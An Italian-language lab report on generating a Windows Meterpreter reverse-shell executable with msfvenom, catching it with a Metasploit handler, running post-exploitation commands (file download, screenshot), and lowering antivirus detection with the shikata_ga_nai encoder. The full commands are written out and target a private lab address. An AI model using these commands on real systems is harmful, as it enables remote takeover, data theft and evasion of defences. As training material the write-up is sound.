
# Relazione sull'Esercizio di Cybersecurity 🚀

## Obiettivo 🎯

L'obiettivo dell'esercizio era creare un malware utilizzando **msfvenom** e migliorare la sua non rilevabilità rispetto a un malware standard. Questo esercizio ci ha permesso di esplorare le tecniche utilizzate dagli attaccanti per eludere i sistemi di sicurezza e comprendere meglio le strategie difensive.

---

## Preparazione dell'Ambiente ⚙️

### Configurazione delle Macchine Virtuali 💻
- **Kali Linux**:
  - Sistema operativo utilizzato per creare il malware.
  - Configurazione della rete in modalità "Rete Interna".
  - IP assegnato: `169.254.107.5`.
- **Flare-VM (Windows 10)**:
  - Sistema operativo bersaglio per testare il malware.
  - Disabilitati antivirus e Windows Defender per simulare un ambiente vulnerabile.

### Strumenti Utilizzati 🛠️
- **msfvenom**: Per generare il payload.
- **Metasploit Framework**: Per configurare il listener.
- **Python HTTP Server**: Per trasferire il malware al sistema bersaglio.
- **VirusTotal**: Per analizzare la rilevabilità del malware.

---

## Creazione del Malware 💾

### Comando Utilizzato per Generare il Malware
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=169.254.107.5 LPORT=4444 -f exe -o malware.exe
```
- **Payload**: `windows/meterpreter/reverse_tcp`
- **LHOST**: `169.254.107.5` (IP di Kali Linux).
- **LPORT**: `4444` (porta per la connessione inversa).
- **Formato**: `.exe` (eseguibile Windows).

Il file `malware.exe` è stato salvato nella directory corrente su Kali Linux.

### Configurazione di Metasploit 🧰

Nel terminale di Metasploit sono stati eseguiti i seguenti comandi:
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 169.254.107.5
set LPORT 4444
exploit
```
Questo ha avviato un listener per catturare la connessione inversa.

---

## Trasferimento del Malware 📂

Per trasferire il malware alla macchina Flare-VM:
1. **Avvio del server HTTP su Kali Linux**:
   ```bash
   python3 -m http.server 8080
   ```
2. **Download del file su Flare-VM**:
   - Attraverso il browser di Flare-VM, è stato scaricato il file accedendo a:
     ```
     http://169.254.107.5:8080/malware.exe
     ```

---

## Esecuzione e Analisi del Malware 🕵️‍♂️

### Esecuzione del Malware
Il file `malware.exe` è stato eseguito su Flare-VM, stabilendo una connessione con il listener di Metasploit su Kali Linux. Una volta stabilita la sessione **Meterpreter**, sono stati eseguiti i seguenti comandi:

1. **Informazioni di Sistema**:
   ```bash
   sysinfo
   ```
   - Sistema operativo: Windows 10.
   - Architettura: x64.

   ![Informazioni di Sistema](image1.png)

2. **Elenco dei Processi**:
   ```bash
   ps
   ```
   - Sono stati identificati processi attivi per eventuali analisi future.

   ![Elenco dei Processi](image2.png)

3. **Navigazione nel File System**:
   ```bash
   ls
   cd C:\Users
   ```
   - Sono stati elencati file e directory nella cartella utente.

   ![Navigazione nel File System](image3.png)

4. **Download di File**:
   ```bash
   download C:\Users\utente\Desktop\documento.txt
   ```

5. **Screenshot del Desktop**:
   ```bash
   screenshot
   ```
   - Uno screenshot del desktop è stato catturato e salvato su Kali Linux.

   ![Screenshot del Desktop](image4.png)

---

## Analisi della Rilevabilità 🔍

### Malware Originale
- **Analisi su VirusTotal**:
  - Numero di rilevazioni: **15 su 60**.
  - Identificato come *Trojan.Generic* da diversi motori antivirus.

### Malware Modificato
Dopo aver applicato tecniche di evasione, è stato generato un nuovo malware con il seguente comando:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=169.254.107.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o malware_encoded.exe
```
- **Tecniche di evasione applicate**:
  - Encoder: `shikata_ga_nai` con 10 iterazioni.

- **Analisi su VirusTotal**:
  - Numero di rilevazioni: **5 su 60**.
  - Il malware è stato rilevato da meno motori antivirus rispetto alla versione originale.

---

## Conclusioni 🏁

### Risultati
- Il malware originale era facilmente rilevabile da molti antivirus.
- Dopo l'applicazione di tecniche di evasione, la rilevabilità è stata significativamente ridotta.
- La sessione **Meterpreter** ha consentito di eseguire con successo azioni come la raccolta di informazioni di sistema, l'esplorazione del file system e la cattura di screenshot.

### Capacità Acquisite
- Creazione di malware con msfvenom.
- Configurazione di listener con Metasploit.
- Tecniche di evasione per migliorare la non rilevabilità.
- Analisi dei risultati utilizzando VirusTotal.

### Possibili Migliorie
- Utilizzo di tecniche di evasione più avanzate, come la scrittura di payload personalizzati.
- Integrazione con strumenti come Veil-Evasion per automatizzare l'offuscamento.
- Studio di metodi per bypassare non solo antivirus, ma anche analisi comportamentali.

---

**Nota**: Questo esercizio è stato svolto esclusivamente a scopo educativo, in un ambiente controllato, per comprendere le tecniche di attacco e migliorare le difese contro di esse.
